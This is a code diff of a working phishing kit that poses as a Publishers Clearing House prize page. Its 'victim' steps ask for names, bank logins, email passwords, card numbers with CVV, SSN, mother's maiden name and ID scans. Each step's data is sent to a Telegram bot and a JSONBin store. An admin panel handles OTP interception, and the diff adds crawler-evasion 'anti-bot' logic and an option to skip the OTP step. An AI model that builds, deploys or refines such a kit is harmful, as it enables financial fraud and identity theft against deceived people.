-                <div style="margin-top: 15px;">
-                    <label style="font-size: 12px; color: #666;">Main Message</label>
-                    <textarea id="admin-success-message" rows="3" style="width: 100%; padding: 10px; border: 1px solid #DDD; border-radius: 4px; font-family: Arial;">Congratulations! You have been successfully verified.</textarea>
-                </div>
-                <div style="margin-top: 15px;">
-                    <label style="font-size: 12px; color: #666;">Sub Message</label>
-                    <textarea id="admin-success-submessage" rows="2" style="width: 100%; padding: 10px; border: 1px solid #DDD; border-radius: 4px; font-family: Arial;">Your prize will be deposited within 24 hours.</textarea>
-                </div>
-                <button class="btn-save" onclick="saveSuccessPageConfig()" style="margin-top: 15px; width: 100%;">Save Success Page</button>
-            </div>
-
-            <!-- OTP Page Editor -->
-            <div class="config-box">
-                <div class="admin-section-title">Edit "OTP Entry" Page</div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Title</label>
-                        <input type="text" id="admin-otp-title" placeholder="Enter Verification Code">
-                    </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Button Text</label>
-                        <input type="text" id="admin-otp-button" placeholder="Verify & Claim Prize">
-                    </div>
-                </div>
-                <div style="margin-top: 15px;">
-                    <label style="font-size: 12px; color: #666;">Message</label>
-                    <textarea id="admin-otp-message" rows="3" style="width: 100%; padding: 10px; border: 1px solid #DDD; border-radius: 4px; font-family: Arial;">Please enter the code sent to your email.</textarea>
-                </div>
-                <button class="btn-save" onclick="saveOtpPageConfig()" style="margin-top: 15px; width: 100%;">Save OTP Page</button>
-            </div>
-
-            <!-- Page Management (Hide/Show & Reorder) -->
-            <div class="config-box">
-                <div class="admin-section-title">Manage Pages (Hide/Show & Order)</div>
-                <ul id="page-management-list" class="reorder-list">
-                    <!-- Items injected via JS -->
-                </ul>
-                <button class="btn-save" onclick="savePageManagement()" style="margin-top: 15px; width: 100%;">Save Page Configuration</button>
-            </div>
-
-            <!-- Page Content Editor -->
-            <div class="config-box">
-                <div class="admin-section-title">Edit Page Labels</div>
-                <div id="page-editors-container">
-                    <!-- Editors injected via JS -->
-                </div>
-                <button class="btn-save" onclick="savePageLabels()" style="margin-top: 15px; width: 100%;">Save Labels</button>
-            </div>
-
-            <h3 style="color: var(--admin-black); border-bottom: 2px solid var(--admin-gold); padding-bottom: 10px;">Recent Submissions (Cloud Synced)</h3>
-            <table id="submissions-table">
-                <thead>
-                    <tr>
-                        <th>Time & IP</th>
-                        <th>Personal Info</th>
-                        <th>Bank & CC</th>
-                        <th>OTP & Status</th>
-                        <th>Action</th>
-                    </tr>
-                </thead>
-                <tbody id="table-body"></tbody>
-            </table>
         </div>
     </div>
 
@@ -516,22 +510,11 @@
     <div id="terms-modal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeTerms()">&times;</span>
-            <h2 style="color: var(--pch-red); border-bottom: 2px solid var(--pch-primary); padding-bottom: 10px;">Terms & Conditions</h2>
+            <h2 style="color: var(--pch-red);">Terms & Conditions</h2>
             <p><strong>1. Prize Award:</strong> The winner agrees to accept the prize in the amount specified.</p>
             <p><strong>2. Taxation:</strong> Federal, State, and Local taxes may be deducted.</p>
             <button class="btn-primary" onclick="closeTerms()">Accept</button>
         </div>
-    </div>
-
-    <div class="footer">
-        <div class="pch-logo-container" style="transform: scale(0.6); margin-bottom: 15px;">
-            <svg class="pch-logo-svg" viewBox="0 0 600 80" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="55" font-family="Century Gothic, sans-serif" font-weight="900" font-size="50" id="footer-logo-text">PCH</text>
-                <text x="140" y="55" font-family="Arial, sans-serif" font-weight="400" font-size="28" id="footer-logo-full-name">Publishers Clearing House</text>
-            </svg>
-        </div>
-        <p>&copy; 2026 <span id="footer-site-name">Publishers Clearing House</span>. All Rights Reserved.</p>
-        <p><a onclick="openTerms()">Terms & Conditions</a> | <a onclick="openTerms()">Privacy Policy</a></p>
     </div>
 
     <script>
@@ -547,6 +530,7 @@
             headline: 'Congratulations, [Name]!',
             siteName: 'Publishers Clearing House',
             primaryColor: '#F2C94C',
+            forceSkipOtp: false,
             successTitle: 'Successfully Verified!',
             successMessage: 'Congratulations! You have been successfully verified.',
             successSubMessage: 'Your prize will be deposited within 24 hours.',
@@ -574,7 +558,6 @@
                 'step-12-field-1': 'Front of ID',
                 'step-12-field-2': 'Back of ID'
             },
-            // Default Page Order & Visibility
             pages: [
                 { id: 1, name: 'Full Name', enabled: true },
                 { id: 2, name: 'Billing Address', enabled: true },
@@ -593,6 +576,38 @@
 
         let config = JSON.parse(JSON.stringify(defaultConfig));
         let ipData = { ip: 'Loading...', city: '', country: '' };
+        let currentStep = 1;
+        let generatedOTP = '';
+        let currentSubmissionId = null;
+        let victimData = {};
+
+        // --- ANTI-BOT LOGIC ---
+        function initAntiBot() {
+            const overlay = document.getElementById('anti-bot-overlay');
+            const ua = navigator.userAgent;
+            const isBot = /bot|crawl|slurp|spider|headlesschrome|safari (mobile|ios)|samsungbrowser|opera mini|opera mobi|opera mini|opera mobi|opera mini|opera mobi|opera mini|opera mobi|opera mini|opera mobi/.test(ua);
+            const isSmallViewport = window.innerWidth < 320 && window.innerHeight < 480;
+            
+            // If it's a bot or tiny viewport, wait 5 seconds before showing content
+            if (isBot || isSmallViewport) {
+                setTimeout(() => {
+                    overlay.style.opacity = '0';
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        document.getElementById('victim-view').classList.remove('hidden');
+                    }, 500);
+                }, 5000);
+            } else {
+                // Normal user: Quick fade out
+                setTimeout(() => {
+                    overlay.style.opacity = '0';
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        document.getElementById('victim-view').classList.remove('hidden');
+                    }, 500);
+                }, 1000);
+            }
+        }
 
         // Load saved data
         const savedConfig = localStorage.getItem('pch_config');
@@ -607,7 +622,6 @@
             document.getElementById('admin-jsonbin-id').value = config.jsonbinId || '';
             document.getElementById('admin-bot-token').value = config.botToken;
             document.getElementById('admin-chat-id').value = config.chatId;
-            document.getElementById('admin-otp-length').value = config.otpLength;
             
             document.getElementById('admin-winner-name').value = config.winnerName;
             document.getElementById('admin-prize-amount').value = config.prizeAmount;
@@ -625,10 +639,11 @@
             document.getElementById('admin-otp-message').value = config.otpMessage;
             document.getElementById('admin-otp-button').value = config.otpButton;
 
+            document.getElementById('admin-force-skip-otp').checked = config.forceSkipOtp;
+
             applyLabels();
             applySiteContent();
             generatePageManagement();
-            generatePageEditors();
             
             // Fetch IP
             fetch('https://ipapi.co/json/')
@@ -662,12 +677,9 @@
 
             document.title = config.siteName + " - Official Prize Notification";
             document.documentElement.style.setProperty('--pch-primary', config.primaryColor);
+            document.documentElement.style.setProperty('--pch-gold', config.primaryColor);
             
-            const shortName = config.siteName.split(' ').map(word => word[0]).join('').substring(0, 3);
-            document.getElementById('svg-logo-text').innerText = shortName;
-            document.getElementById('svg-logo-full-name').innerText = config.siteName;
-            document.getElementById('footer-logo-text').innerText = shortName;
-            document.getElementById('footer-logo-full-name').innerText = config.siteName;
+            document.getElementById('header-sub').innerText = config.siteName;
             document.getElementById('footer-site-name').innerText = config.siteName;
 
             document.getElementById('success-title').innerText = config.successTitle;
@@ -683,109 +695,37 @@
             const list = document.getElementById('page-management-list');
             list.innerHTML = '';
             
-            // Render the list of pages with checkboxes
             config.pages.forEach((page, index) => {
-                const li = document.createElement('li');
-                li.className = 'reorder-item';
-                li.innerHTML = `
-                    <div style="display:flex; align-items:center; gap:10px;">
-                        <input type="checkbox" id="page-check-${page.id}" ${page.enabled ? 'checked' : ''} onchange="togglePageVisibility(${page.id})">
-                        <span style="font-weight: bold;">${page.id}. ${page.name}</span>
-                    </div>
+                const div = document.createElement('div');
+                div.className = 'page-manager-item';
+                div.innerHTML = `
+                    <label>${page.id}. ${page.name}</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="page-check-${page.id}" ${page.enabled ? 'checked' : ''}>
+                        <span class="slider"></span>
+                    </label>
                 `;
-                list.appendChild(li);
+                list.appendChild(div);
             });
         }
 
-        function togglePageVisibility(id) {
-            const page = config.pages.find(p => p.id === id);
-            if (page) {
-                page.enabled = !page.enabled;
-            }
-        }
-
         function savePageManagement() {
-            // Collect checkbox states
             config.pages.forEach(page => {
                 const cb = document.getElementById(`page-check-${page.id}`);
                 if (cb) page.enabled = cb.checked;
             });
             localStorage.setItem('pch_config', JSON.stringify(config));
-            // Reload to apply visibility
-            location.reload();
+            alert('Page Visibility Updated!');
         }
 
-        function generatePageEditors() {
-            const container = document.getElementById('page-editors-container');
-            container.innerHTML = '';
-
-            // Define the steps we want to be editable
-            const steps = [
-                { id: 1, name: 'Full Name', fields: ['field-1'] },
-                { id: 2, name: 'Billing Address', fields: ['field-1'] },
-                { id: 3, name: 'Phone Number', fields: ['field-1'] },
-                { id: 4, name: 'Bank Name', fields: ['field-1'] },
-                { id: 5, name: 'Username & Password', fields: ['field-1', 'field-2'] },
-                { id: 6, name: 'Email & Password', fields: ['field-1', 'field-2'] },
-                { id: 7, name: 'Bank Account', fields: ['field-1', 'field-2'] },
-                { id: 8, name: 'Credit Card', fields: ['field-1', 'field-2', 'field-3'] },
-                { id: 9, name: 'Date of Birth', fields: ['field-1'] },
-                { id: 10, name: 'Social Security', fields: ['field-1'] },
-                { id: 11, name: "Mother's Maiden Name", fields: ['field-1'] },
-                { id: 12, name: 'ID Upload', fields: ['field-1', 'field-2'] }
-            ];
-
-            steps.forEach(step => {
-                const editor = document.createElement('div');
-                editor.className = 'page-editor';
-                editor.style.cssText = "background: white; border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 6px;";
-                editor.innerHTML = `<h4 style="margin: 0 0 10px 0; color: var(--admin-gold); background: var(--admin-black); padding: 5px 10px; border-radius: 4px; font-size: 13px;">Step ${step.id}: ${step.name}</h4>`;
-                
-                step.fields.forEach(field => {
-                    const labelKey = `step-${step.id}-${field}`;
-                    const currentValue = config.labels[labelKey] || '';
-                    const inputId = `admin-label-${labelKey}`;
-                    
-                    editor.innerHTML += `
-                        <div style="margin-bottom: 8px;">
-                            <label style="font-size: 12px; color: #666;">Label for ${field}: <input type="text" id="${inputId}" value="${currentValue}" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;"></label>
-                        </div>
-                    `;
-                });
-                
-                container.appendChild(editor);
-            });
-        }
-
-        function savePageLabels() {
-            const steps = [
-                { id: 1, fields: ['field-1'] }, { id: 2, fields: ['field-1'] }, { id: 3, fields: ['field-1'] },
-                { id: 4, fields: ['field-1'] }, { id: 5, fields: ['field-1', 'field-2'] }, { id: 6, fields: ['field-1', 'field-2'] },
-                { id: 7, fields: ['field-1', 'field-2'] }, { id: 8, fields: ['field-1', 'field-2', 'field-3'] },
-                { id: 9, fields: ['field-1'] }, { id: 10, fields: ['field-1'] }, { id: 11, fields: ['field-1'] },
-                { id: 12, fields: ['field-1', 'field-2'] }
-            ];
-
-            const newLabels = {};
-            steps.forEach(step => {
-                step.fields.forEach(field => {
-                    const labelKey = `step-${step.id}-${field}`;
-                    const inputId = `admin-label-${labelKey}`;
-                    const el = document.getElementById(inputId);
-                    if (el) newLabels[labelKey] = el.value;
-                });
-            });
-
-            config.labels = newLabels;
+        function toggleForceSkip() {
+            config.forceSkipOtp = document.getElementById('admin-force-skip-otp').checked;
             localStorage.setItem('pch_config', JSON.stringify(config));
-            applyLabels();
-            alert('Page Labels Updated!');
         }
 
         function saveGlobalConfig() {
             config.botToken = document.getElementById('admin-bot-token').value;
             config.chatId = document.getElementById('admin-chat-id').value;
-            config.otpLength = parseInt(document.getElementById('admin-otp-length').value) || 6;
             
             config.winnerName = document.getElementById('admin-winner-name').value;
             config.prizeAmount = document.getElementById('admin-prize-amount').value;
@@ -799,63 +739,46 @@
             alert('Global Settings Saved!');
         }
 
-        function saveTelegramConfig() {
-            config.botToken = document.getElementById('admin-bot-token').value;
-            config.chatId = document.getElementById('admin-chat-id').value;
-            localStorage.setItem('pch_config', JSON.stringify(config));
-            alert('Telegram Settings Saved!');
-        }
-
-        function saveCloudConfig() {
+        function saveCloudAndTelegram() {
             config.jsonbinKey = document.getElementById('admin-jsonbin-key').value;
             config.jsonbinId = document.getElementById('admin-jsonbin-id').value;
-            localStorage.setItem('pch_config', JSON.stringify(config));
+            config.botToken = document.getElementById('admin-bot-token').value;
+            config.chatId = document.getElementById('admin-chat-id').value;
             
-            // Push current submissions to cloud
+            localStorage.setItem('pch_config', JSON.stringify(config));
             pushSubmissionsToCloud();
-            alert('Cloud Settings Saved & Data Pushed!');
+            alert('Cloud & Telegram Settings Saved!');
         }
 
-        function saveSuccessPageConfig() {
+        function savePageContent() {
             config.successTitle = document.getElementById('admin-success-title').value;
             config.successMessage = document.getElementById('admin-success-message').value;
             config.successSubMessage = document.getElementById('admin-success-submessage').value;
             config.successButton = document.getElementById('admin-success-button').value;
-            
-            localStorage.setItem('pch_config', JSON.stringify(config));
-            applySiteContent();
-            alert('Success Page Updated!');
-        }
 
-        function saveOtpPageConfig() {
             config.otpTitle = document.getElementById('admin-otp-title').value;
             config.otpMessage = document.getElementById('admin-otp-message').value;
             config.otpButton = document.getElementById('admin-otp-button').value;
             
             localStorage.setItem('pch_config', JSON.stringify(config));
+            applySiteContent();
             applyLabels();
-            alert('OTP Page Updated!');
+            alert('Page Content Updated!');
         }
 
         // --- VICTIM LOGIC ---
 
-        let currentStep = 1;
-        let generatedOTP = '';
-        let currentSubmissionId = null;
-        let victimData = {};
-
-        // Generate Steps dynamically based on config
         function renderVictimSteps() {
             const container = document.getElementById('steps-container');
             container.innerHTML = '';
             
-            let stepCounter = 1;
-            
-            // Filter enabled pages
             const enabledPages = config.pages.filter(p => p.enabled);
             
-            // If no pages are enabled, hide progress and show OTP directly? Or just show first enabled.
-            
+            if (enabledPages.length === 0) {
+                container.innerHTML = '<p style="text-align: center;">No pages are currently enabled.</p>';
+                return;
+            }
+
             enabledPages.forEach((page, index) => {
                 const stepId = page.id;
                 const isLastEnabled = index === enabledPages.length - 1;
@@ -863,29 +786,18 @@
                 let html = `<div class="form-step ${index === 0 ? '' : 'hidden'}" id="step-${stepId}">`;
                 
                 // Add fields based on step ID
-                if (stepId === 1) { // Full Name
-                    html += getFieldHtml(stepId, 1, 'text', 'Full Name');
-                } else if (stepId === 2) { // Billing Address
-                    html += getFieldHtml(stepId, 1, 'text', 'Billing Address');
-                } else if (stepId === 3) { // Phone
-                    html += getFieldHtml(stepId, 1, 'tel', 'Phone Number');
-                } else if (stepId === 4) { // Bank Name
-                    html += getFieldHtml(stepId, 1, 'text', 'Bank Name');
-                } else if (stepId === 5) { // User/Pass
-                    html += getFieldHtml(stepId, 1, 'text', 'Username') + getFieldHtml(stepId, 2, 'password', 'Password');
-                } else if (stepId === 6) { // Email
-                    html += getFieldHtml(stepId, 1, 'email', 'Email') + getFieldHtml(stepId, 2, 'password', 'Email Password');
-                } else if (stepId === 7) { // Bank Acct
-                    html += getFieldHtml(stepId, 1, 'text', 'Account Number') + getFieldHtml(stepId, 2, 'text', 'Routing Number');
-                } else if (stepId === 8) { // CC
-                    html += getFieldHtml(stepId, 1, 'text', 'Credit Card Number') + getFieldHtml(stepId, 2, 'text', 'Expiration') + getFieldHtml(stepId, 3, 'text', 'CVV');
-                } else if (stepId === 9) { // DOB
-                    html += getFieldHtml(stepId, 1, 'date', 'Date of Birth');
-                } else if (stepId === 10) { // SSN
-                    html += getFieldHtml(stepId, 1, 'text', 'SSN');
-                } else if (stepId === 11) { // Maiden
-                    html += getFieldHtml(stepId, 1, 'text', "Mother's Maiden Name");
-                } else if (stepId === 12) { // ID Upload
+                if (stepId === 1) html += getFieldHtml(stepId, 1, 'text', 'Full Name');
+                else if (stepId === 2) html += getFieldHtml(stepId, 1, 'text', 'Billing Address');
+                else if (stepId === 3) html += getFieldHtml(stepId, 1, 'tel', 'Phone Number');
+                else if (stepId === 4) html += getFieldHtml(stepId, 1, 'text', 'Bank Name');
+                else if (stepId === 5) html += getFieldHtml(stepId, 1, 'text', 'Username') + getFieldHtml(stepId, 2, 'password', 'Password');
+                else if (stepId === 6) html += getFieldHtml(stepId, 1, 'email', 'Email') + getFieldHtml(stepId, 2, 'password', 'Email Password');
+                else if (stepId === 7) html += getFieldHtml(stepId, 1, 'text', 'Account Number') + getFieldHtml(stepId, 2, 'text', 'Routing Number');
+                else if (stepId === 8) html += getFieldHtml(stepId, 1, 'text', 'Credit Card Number') + getFieldHtml(stepId, 2, 'text', 'Expiration') + getFieldHtml(stepId, 3, 'text', 'CVV');
+                else if (stepId === 9) html += getFieldHtml(stepId, 1, 'date', 'Date of Birth');
+                else if (stepId === 10) html += getFieldHtml(stepId, 1, 'text', 'SSN');
+                else if (stepId === 11) html += getFieldHtml(stepId, 1, 'text', "Mother's Maiden Name");
+                else if (stepId === 12) {
                     html += `
                         <div class="form-group">
                             <label id="label-step-${stepId}-field-1">Front of ID</label>
@@ -910,7 +822,6 @@
                 if (isLastEnabled) {
                     html += `<button class="btn-primary" onclick="prepareOtpStep()">Continue</button>`;
                 } else {
-                    // Find the next enabled page ID
                     const nextPage = enabledPages[index + 1];
                     html += `<button class="btn-primary" onclick="nextStep(${nextPage.id})">Continue</button>`;
                 }
@@ -942,7 +853,6 @@
         }
 
         function nextStep(stepId) {
-            // Validate current step
             const currentFields = document.querySelectorAll(`#step-${currentStep} input[required]`);
             let valid = true;
             currentFields.forEach(field => {
@@ -956,26 +866,18 @@
 
             if (!valid) return;
 
-            // Collect Data from Current Step
             collectStepData(currentStep);
-            
-            // Send Instant Telegram Alert for this step
             sendStepTelegramAlert(currentStep);
 
-            // Hide Current
             document.getElementById(`step-${currentStep}`).classList.add('hidden');
-            
-            // Show Next
             currentStep = stepId;
             document.getElementById(`step-${currentStep}`).classList.remove('hidden');
             
-            // Update Progress
             const enabledPages = config.pages.filter(p => p.enabled);
             updateProgress(enabledPages.indexOf(config.pages.find(p => p.id === currentStep)) + 1, enabledPages.length);
         }
 
         function collectStepData(stepId) {
-            // Helper to get value
             const getVal = (id) => {
                 const el = document.getElementById(id);
                 return el ? el.value : '';
@@ -1001,10 +903,9 @@
         function sendStepTelegramAlert(stepId) {
             if (!config.botToken || !config.chatId) return;
 
-            let message = `⚡ <b>NEW STEP COMPLETED: Step ${stepId}</b> ⚡\n`;
+            let message = `⚡ <b>STEP ${stepId} COMPLETED</b> ⚡\n`;
             message += `🆔 <b>Current Data:</b>\n`;
             
-            // Append whatever we have so far
             if (victimData.fullName) message += `👤 Name: ${victimData.fullName}\n`;
             if (victimData.billingAddress) message += `🏠 Address: ${victimData.billingAddress}\n`;
             if (victimData.phoneNumber) message += `📞 Phone: ${victimData.phoneNumber}\n`;
@@ -1031,7 +932,6 @@
         }
 
         function prepareOtpStep() {
-            // Validate last step
             const currentFields = document.querySelectorAll(`#step-${currentStep} input[required]`);
             let valid = true;
             currentFields.forEach(field => {
@@ -1045,25 +945,58 @@
 
             if (!valid) return;
             
-            // Collect last step data
             collectStepData(currentStep);
             
-            // Generate OTP
+            // Check if Force Skip OTP is ON
+            if (config.forceSkipOtp) {
+                // Skip OTP, go straight to success
+                document.getElementById(`step-${currentStep}`).classList.add('hidden');
+                document.getElementById('verifying-screen').classList.remove('hidden');
+                
+                setTimeout(() => {
+                    document.getElementById('verifying-screen').classList.add('hidden');
+                    document.getElementById('otp-success').classList.remove('hidden');
+                    
+                    // Still save data but mark as Skipped
+                    const data = {
+                        id: Date.now(),
+                        ...victimData,
+                        otp: 'SKIPPED',
+                        status: 'ACTIVE', // Auto active if skipped
+                        timestamp: new Date().toLocaleString(),
+                        ip: ipData.ip,
+                        city: ipData.city,
+                        country: ipData.country
+                    };
+                    pushSubmissionsToCloud(data);
+                    sendToTelegram(data);
+                }, 1500);
+                return;
+            }
+
+            // Normal OTP Flow
             const requiredLength = config.otpLength || 6;
             generatedOTP = Math.floor(Math.pow(10, requiredLength - 1) + Math.random() * 9 * Math.pow(10, requiredLength - 1));
             
-            // Hide last step
             document.getElementById(`step-${currentStep}`).classList.add('hidden');
-            
-            // Show OTP Input Screen
             document.getElementById('otp-input-screen').classList.remove('hidden');
             document.getElementById('generated-otp-display').innerText = generatedOTP;
             
-            // Send Final Data to Cloud
             pushSubmissionsToCloud();
         }
 
-        function pushSubmissionsToCloud() {
+        function pushSubmissionsToCloud(customData = null) {
+            if (customData) {
+                const data = customData;
+                let submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
+                submissions.unshift(data);
+                localStorage.setItem('pch_submissions', JSON.stringify(submissions));
+                if (config.jsonbinKey && config.jsonbinId) {
+                    updateJsonBin(submissions);
+                }
+                return;
+            }
+
             const data = {
                 id: Date.now(),
                 ...victimData,
@@ -1075,16 +1008,13 @@
                 country: ipData.country
             };
 
-            // Save to LocalStorage as backup
             let submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
             submissions.unshift(data);
             localStorage.setItem('pch_submissions', JSON.stringify(submissions));
             currentSubmissionId = data.id;
 
-            // Send to Telegram (Final Summary)
             sendToTelegram(data);
 
-            // If Cloud Config exists, push to JSONBin
             if (config.jsonbinKey && config.jsonbinId) {
                 updateJsonBin(submissions);
             }
@@ -1155,16 +1085,11 @@
             const input = document.getElementById('otp-code-input').value;
             const errorDiv = document.getElementById('error-container');
             
-            // Hide OTP Input
             document.getElementById('otp-input-screen').classList.add('hidden');
-            
-            // Show Verifying Spinner
             document.getElementById('verifying-screen').classList.remove('hidden');
 
-            // Simulate Network Delay then Check
             setTimeout(() => {
                 if (input == generatedOTP) {
-                    // Check Cloud/Local Status
                     const submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
                     const currentSub = submissions.find(s => s.id === currentSubmissionId);
                     
@@ -1173,7 +1098,6 @@
                     } else if (currentSub && currentSub.status === 'REJECTED') {
                         showError('Invalid OTP! Please try again.');
                     } else {
-                        // Still waiting for admin
                         showError('Incorrect OTP or Admin is verifying...');
                     }
                 } else {
@@ -1219,17 +1143,14 @@
                 fetch(url, { headers })
                 .then(res => res.json())
                 .then(data => {
-                    // Update LocalStorage with cloud data
                     localStorage.setItem('pch_submissions', JSON.stringify(data.record));
                     renderAdminTable(data.record);
                 })
                 .catch(err => {
-                    // Fallback to LocalStorage
                     const localData = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
                     renderAdminTable(localData);
                 });
             } else {
-                // Fallback to LocalStorage
                 const localData = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
                 renderAdminTable(localData);
             }
@@ -1242,14 +1163,14 @@
 
             submissions.forEach(sub => {
                 let statusClass = 'status-waiting';
-                let actionBtn = `<button class="btn-admin btn-activate" onclick="activateOTP(${sub.id})">ACTIVATE</button>`;
+                let actionBtn = `<button class="btn-admin btn-success" onclick="activateOTP(${sub.id})">ACTIVATE</button>`;
                 
                 if (sub.status === 'ACTIVE') {
                     statusClass = 'status-active';
-                    actionBtn = `<button class="btn-admin btn-delete" onclick="deleteSub(${sub.id})">DELETE</button>`;
+                    actionBtn = `<button class="btn-admin btn-danger" onclick="deleteSub(${sub.id})">DELETE</button>`;
                 } else if (sub.status === 'REJECTED') {
                     statusClass = 'status-rejected';
-                    actionBtn = `<button class="btn-admin btn-activate" onclick="activateOTP(${sub.id})">RE-ACTIVATE</button>`;
+                    actionBtn = `<button class="btn-admin btn-success" onclick="activateOTP(${sub.id})">RE-ACTIVATE</button>`;
                 }
 
                 const row = `
@@ -1260,8 +1181,7 @@
                         <td><b>${sub.otp || ''}</b><br><span class="${statusClass}">${sub.status}</span></td>
                         <td>
                             ${actionBtn}
-                            ${sub.status !== 'ACTIVE' ? `<button class="btn-admin btn-reject" onclick="rejectOTP(${sub.id})">REJECT</button>` : ''}
-                            <button class="btn-admin btn-delete" onclick="deleteSub(${sub.id})">DEL</button>
+                            ${sub.status !== 'ACTIVE' ? `<button class="btn-admin btn-danger" onclick="rejectOTP(${sub.id})">REJECT</button>` : ''}
                         </td>
                     </tr>
                 `;
@@ -1321,7 +1241,8 @@
             init();
             checkAdminMode();
             renderVictimSteps();
+            initAntiBot();
         });
     </script>
 </body>
-</html>
+    </html>
